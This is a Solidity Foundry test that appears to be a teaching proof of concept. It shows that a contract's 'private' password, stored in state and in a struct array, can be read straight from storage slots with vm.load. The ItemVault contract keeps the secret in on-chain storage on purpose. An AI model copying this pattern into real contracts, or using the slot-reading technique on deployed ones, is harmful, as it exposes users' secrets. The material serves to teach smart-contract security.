pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract ContractTest is Test {
    ItemVault ItemvaultContract;

    function testReadprivatedata() public {
        ItemvaultContract = new ItemVault(123456789);
        bytes32 leet = vm.load(address(ItemvaultContract), bytes32(uint256(0)));
        console.log(uint256(leet));


        bytes32 warrior = vm.load(
            address(ItemvaultContract),
            ItemvaultContract.getArrayLocation(1, 1, 1)
        );
        console.log(uint256(warrior));
    }
}

contract ItemVault {

    uint256 private password;

    constructor(uint256 _password) {
        password = _password;
        Player memory warrior = Player({id: 0, password: bytes32(_password)});
        users.push(warrior);
        idToWarrior[0] = warrior;
    }

    struct Player {
        uint id;
        bytes32 password;
    }


    Player[] public users;

    mapping(uint => Player) public idToWarrior;

    function getArrayLocation(
        uint slot,
        uint index,
        uint elementSize
    ) public pure returns (bytes32) {
        uint256 a = uint(keccak256(abi.encodePacked(slot))) +
            (index * elementSize);
        return bytes32(a);
    }
}